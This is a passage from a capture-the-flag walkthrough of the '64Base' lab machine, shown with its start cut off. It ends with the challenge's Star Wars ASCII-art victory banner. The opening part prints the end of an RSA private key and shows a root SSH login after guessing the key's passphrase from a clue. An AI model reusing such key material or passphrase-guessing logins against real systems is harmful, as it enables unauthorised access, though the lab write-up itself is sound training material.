</span><span class='line'>MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
</span><span class='line'>k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
</span><span class='line'>wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
</span><span class='line'>guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
</span><span class='line'>TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
</span><span class='line'>2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
</span><span class='line'>AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
</span><span class='line'>4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
</span><span class='line'>+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
</span><span class='line'>fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
</span><span class='line'>+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
</span><span class='line'>13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
</span><span class='line'>rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
</span><span class='line'>Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
</span><span class='line'>Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
</span><span class='line'>Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
</span><span class='line'>Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
</span><span class='line'>qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
</span><span class='line'>64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
</span><span class='line'>fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
</span><span class='line'>/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>


<p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.145.138 -p 62964 -i ssh.key
</span><span class='line'>Enter passphrase for key 'ssh.key': 
</span><span class='line'>
</span><span class='line'>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18
</span><span class='line'>
</span><span class='line'>flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
</span><span class='line'>root@64base:~# </span></code></pre></td></tr></table></div></figure>


<p>Almost over, because that flag required several decoding cycles before it gave me something usable: <code>base64 -d /var/local/.luke|less.real</code>. With that, I ran it and got the mission success message, which will take a couple of minutes to read:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>     __          __  _ _   _____                      
</span><span class='line'>     \ \        / / | | | |  __ \                     
</span><span class='line'>      \ \  /\  / /__| | | | |  | | ___  _ __   ___    
</span><span class='line'>       \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \   
</span><span class='line'>        \  /\  /  __/ | | | |__| | (_) | | | |  __/   
</span><span class='line'>     __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _ 
</span><span class='line'>     \ \   / /          |  __ \(_)   | | |_   _| | | |
</span><span class='line'>      \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
</span><span class='line'>       \   / _ \| | | | | |  | | |/ _` |   | | | __| |
</span><span class='line'>        | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
</span><span class='line'>        |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)
</span><span class='line'>
</span><span class='line'>_____ _ _ _ __ __ __  _ ___ _   __  ___  __ __  __  _  ___ _ _  __ _________
</span><span class='line'>%=x%= | |V| |_)|_ |_) | |_| |   |_) |_| (_  |_  |_) |  |_| |\| (_  %=x%=x%=x
</span><span class='line'>~~~~~ | | | |  |_ | \ | | | |_  |_) | | __) |_  |   |_ | | | | __) ~~~~~~~~~
</span><span class='line'>LS
</span><span class='line'>             .-. .-.
</span><span class='line'>           .=========.         E x t e r i o r ,   A e r i a l   V i e w
</span><span class='line'>           ||.-.7.-.||         -----------------------------------------
</span><span class='line'>           ||`-' `-'||
</span><span class='line'>           `========='
</span><span class='line'>            `-'| |`-'8               1 .............. Sensor Suite Tower
</span><span class='line'>      ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
</span><span class='line'>     /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
</span><span class='line'>    /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
</span><span class='line'>   /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
</span><span class='line'>   \____\\`==========='//____/       6 .................... Guard towers
</span><span class='line'>   /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
</span><span class='line'>__/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
</span><span class='line'>   /\ \    ///x`.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
</span><span class='line'>  /  \ \  //`-._//|   |\\_.2'\\  / /  \
</span><span class='line'> /  _.-==='_____//.-=-.\\_____`===-._  \
</span><span class='line'> \   `-===.\-.  \ `-=1' /  .-/.===-' 3 / The pre-fabricated,  multi-function
</span><span class='line'>  \  / /  \\\ \  \.===./  /4///  \ \  /  Imperial garrison base is the back-
</span><span class='line'>   \/_/    \\\ | /.---.\ | ///    \_\/   bone of the  Empire's  occupational
</span><span class='line'>  \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
</span><span class='line'>   \_____\=============/_____/       tresses have  walls up to 10 meters
</span><span class='line'>   /____///    ___    \\\____\       thick  to  guard   against   ground
</span><span class='line'>   \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
</span><span class='line'>    \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
</span><span class='line'>     \_____|  | 5 | 6|_____/         space attacks.
</span><span class='line'>           `--'   `--'
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                       U           E x t e r i o r ,   S i d e   V i e w
</span><span class='line'>                      /_\          -------------------------------------
</span><span class='line'>                   1 [___]
</span><span class='line'>                     :`:':           1 .............. Sensor Suite Tower
</span><span class='line'>                     `:::'           2 ... Heavy Twin Turbolaser Turrets
</span><span class='line'>              _       :_:       _    3 ............. Heavy Laser Turrets
</span><span class='line'>            =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
</span><span class='line'>             :=:      :=:      :=:   5 ............... Heavy Blast Doors
</span><span class='line'>            _|_|_   __| |__   _|_|_  6 .................... Guard Towers
</span><span class='line'>           / /XX|\ /__|_|__\ /|XX\ \
</span><span class='line'>     3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
</span><span class='line'>--===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
</span><span class='line'> /__| |     /l_\\             //_|\     |_|__\
</span><span class='line'>/~~.' |    /:'  \\   _____   //  `:\    | `.  \
</span><span class='line'>   /   | .'   / |    \\==|||||==//    | \   `. |   \   7    8
</span><span class='line'>  /   .' |   / .'     |  ||5|| 6|     `. \   | `.   \  xx=   _
</span><span class='line'> /____|__|__/__|______l__|||||__l______|__\__|__|____\ ll   &lt;~
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                             O u t e r   D e f e n s e s
</span><span class='line'>        |                      |             ---------------------------
</span><span class='line'>     ^_[]_^                 ^_[]_^
</span><span class='line'>     |----|               5 |----|        1 ... High Voltage Death Fence
</span><span class='line'> ________`-..-'________4________`-..-'______  2 ....... Perimeter Gate House
</span><span class='line'> ===========================================  3 ........ Powered Force Field
</span><span class='line'>      `||'                   `||'         4 .......... Fortified Catwalk
</span><span class='line'>       ||     ^==^   ^==^     ||          5 ......... Observattion tower
</span><span class='line'> ___.____._ll_._1_|--|   |--|___._ll_.____.____
</span><span class='line'> XXX|XXXX|XIIX|XXX|--| 3 |--|XXX|XIIX|XXXX|XXXX
</span><span class='line'> XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX
</span><span class='line'>
</span><span class='line'> The outer perimeter is  marked  by a  high-voltage  "death fence."  Powered
</span><span class='line'> Force fields  placed at regular intervals along the fence may be turned off
</span><span class='line'> to permit entry and exit.  Observation towers,  connected by fortified cat-
</span><span class='line'> walks,  are set back from the fence and constantly manned by stormtroopers.
</span><span class='line'> Other outer  defenses  include energy mine fields,  modified patrol Droids,
</span><span class='line'> and AT-ST Scout Walkers.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>         _
</span><span class='line'>        /|                               L a n d i n g   P l a t f o r m
</span><span class='line'>      -==+                               -------------------------------
</span><span class='line'>        :
</span><span class='line'>     [__________]               Up to two Lambda-class shuttles and four
</span><span class='line'>     `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
</span><span class='line'>       ========  =xx            A loading  ramp  leads directly from the
</span><span class='line'>        ||  ||    ll            platform into the garrison complex.
</span><span class='line'> ~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                 I n t e r i o r ,   L e v e l s   1 - 5
</span><span class='line'>                                 ---------------------------------------
</span><span class='line'>
</span><span class='line'>      ______         ______      The first 5 levels of the garrison com-
</span><span class='line'>     / ____ \_______/ ____ \     plex are of identical layout, construc-
</span><span class='line'>    / /    \_________/    \ \    ted  around  a  level-spanning  surface
</span><span class='line'>   / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
</span><span class='line'>   \ \       \_____/_______/ /   determine what each level contains.
</span><span class='line'>   / /    o   |o o|   o    \ \
</span><span class='line'>__/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
</span><span class='line'>   / __/      .' ._o_o_. `.      \__ \         Armory (levels 3-4), Training
</span><span class='line'>  / /  `-.  .' .'  10   `. `.  .-'  \ \        Facilities   and   Recreation
</span><span class='line'> / /      ~' .'`-._____.-'`. `~      \ \       Rooms (level 5)
</span><span class='line'> \ \     o  &lt;  C  | | |  D  &gt;  o  7  / / 2 ... Stormtrooper Barracks (levels
</span><span class='line'>  \ \__      \    ' ' '    /      __/ /        1-3),    Security    Barracks
</span><span class='line'>   \__ \  1  |----  9  ----|~-._ / __/         (levels 4-5)
</span><span class='line'>  \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
</span><span class='line'>   \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
</span><span class='line'>   / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
</span><span class='line'>   \ \      | |   | |      / /       6 ... Technical and Service Person-
</span><span class='line'>    \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
</span><span class='line'>     \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
</span><span class='line'>           `--'   `--'                     Medical   Bay    (level   3),
</span><span class='line'>                                           Science Labs (levels 4-5)
</span><span class='line'>            8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
</span><span class='line'>            9 ...................... Surface Vehicle  Bay  (levels 1-5):
</span><span class='line'>            A .................................. AT-ST Scout Walker Bays
</span><span class='line'>            B ........................................ AT-AT Walker Bays
</span><span class='line'>            C ...................... Vehicle Maintenance and Repair Deck
</span><span class='line'>            D ........................................ Speeder Bike Deck
</span><span class='line'>            10 ........................... Miscellaneous Vehicle Parking
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                       I n t e r i o r ,   L e v e l   6
</span><span class='line'>                                       ---------------------------------
</span><span class='line'>     ____           ____
</span><span class='line'>    / __ \_________/ __ \        Base command personnel,  control rooms,
</span><span class='line'>   / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
</span><span class='line'>   \ \ o     oo      o / /       offices are located on this level.
</span><span class='line'>   / /       oo----.   \ \
</span><span class='line'>  / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
</span><span class='line'>   __/ /\    .~  ||   2   \  \ \__                       and Shield Controls
</span><span class='line'>  / __/  \ .' 9.-'`-.      | /\__ \  2 ....................... Computer Room
</span><span class='line'> / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
</span><span class='line'> \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
</span><span class='line'>  \__ \  /     `-..-'        \/ __/  5 ... Trade Mission, Diplomatic Offices
</span><span class='line'> \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
</span><span class='line'>  \ \ `.     ||    4    / /                                  and offices
</span><span class='line'>   \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
</span><span class='line'>   / /6  ____||_____   \ \       8 ............................. Offices
</span><span class='line'>   \ \__/ _________ \__/ /       9 ................... Base Control Room
</span><span class='line'>    \____/         \____/        10 ..................... Reception Area
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                       I n t e r i o r ,   L e v e l   7
</span><span class='line'>                                       ---------------------------------
</span><span class='line'>    __             __
</span><span class='line'>   /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
</span><span class='line'>   \ \,===========./ /        garrison's TIE fighters in standard-design
</span><span class='line'>   //:o-----------o:\\        ceiling racks.  Bases are usually equipped
</span><span class='line'>  /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
</span><span class='line'> /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
</span><span class='line'>  __/// X X   [___]   X X \\\__   space as two fighters).  Five  to 15 ships
</span><span class='line'> /\_/o X X  1 &/3\&    X X o\_/\  are on constant  patrol,  depending on the
</span><span class='line'> \]_\\ X X   &lt;\\_//&gt;       //_[/  base's readiness level.
</span><span class='line'>\\\ X X   \&gt;&&lt;/2  X []///
</span><span class='line'> \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
</span><span class='line'>  \\\ X   [] []     ///                           (holds up to 40 craft)
</span><span class='line'>   \\:o-----------o://        2 ............. Lift Platforms, to Level 8
</span><span class='line'>   /_/`==========='\_\        3 .................. Flight Control Center
</span><span class='line'>   \_]/           \[_/        X ............................ TIE Fighter
</span><span class='line'>                              [] ............................ TIE Bomber
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                                       I n t e r i o r ,   L e v e l   8
</span><span class='line'>                                       ---------------------------------
</span><span class='line'>                                                  (not shown)
</span><span class='line'>
</span><span class='line'>  The Flight Deck contains the  tractor beam  generators which catapult out-
</span><span class='line'>  going craft into the open sky and reel in landing ships. Pilots relinquish
</span><span class='line'>  control of  their ships during take off and landing because of the limited
</span><span class='line'>  maneuvering area within the chutes.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'>
</span><span class='line'>                           S u b - L e v e l   I n s t a l l a t i o n s
</span><span class='line'>                           ---------------------------------------------
</span><span class='line'>                                            (not shown)
</span><span class='line'>
</span><span class='line'>  A large underground section of the base  houses the main power and back-up
</span><span class='line'>  generators, the tractor beam and deflector shield generators, the environ-
</span><span class='line'>  ment  control  station,  and  the  waste  disposal and refuse units.  Some
</span><span class='line'>  storage facilities are also located here.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
</span><span class='line'>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span><span class='line'> Version 1.9 (released 941211).
</span><span class='line'> Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
</span><span class='line'> VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
</span><span class='line'> black screen  (except for some faces)  with a not too fancy font. Contribu-
</span><span class='line'> tions welcome, email to the adress below. Sources LS: The Star Wars Source-
</span><span class='line'> book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
</span><span class='line'> book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.
</span><span class='line'>
</span><span class='line'>____________________________________________________________________________
</span><span class='line'>
</span><span class='line'>  ______  ______  ______  ______  ______  ______  ______  ______  
</span><span class='line'> |______||______||______||______||______||______||______||______||______| 
</span><span class='line'>  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______  
</span><span class='line'> | \ | | / __ \\ \        / / \ \   / // __ \ | |  | |( )|  __ \ |  ____| 
</span><span class='line'> |  \| || |  | |\ \  /\  / /   \ \_/ /| |  | || |  | ||/ | |__) || |__    
</span><span class='line'> | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  __|   
</span><span class='line'> | |\  || |__| |  \  /\  /       | |  | |__| || |__| |   | | \ \ | |____  
</span><span class='line'> |_| \_| \____/    \/  \/        |_|   \____/  \____/    |_|  \_\|______| 
</span><span class='line'>                            _  ______  _____  _____  _                
</span><span class='line'>         /\                | ||  ____||  __ \|_   _|| |               
</span><span class='line'>        /  \               | || |__   | |  | | | |  | |               
</span><span class='line'>       / /\ \          _   | ||  __|  | |  | | | |  | |               
</span><span class='line'>      / ____ \        | |__| || |____ | |__| |_| |_ |_|               
</span><span class='line'>     /_/    \_\        \____/ |______||_____/|_____|(_)               
</span><span class='line'>  ______  ______  ______  ______  ______  ______  ______  ______  ______  
</span><span class='line'> |______||______||______||______||______||______||______||______||______| 
</span><span class='line'>                                                                      
</span><span class='line'>
</span><span class='line'>                I hope you enjoyed this challenge
</span><span class='line'>                Please leave comments & feedback
</span><span class='line'>                @ https://www.vulnhub.com/?q=64base
</span><span class='line'>                -----------------------------------
</span><span class='line'>                64Base Challenge by 3mrgnc3
</span><span class='line'>                https://3mrgnc3.ninja/challenges   
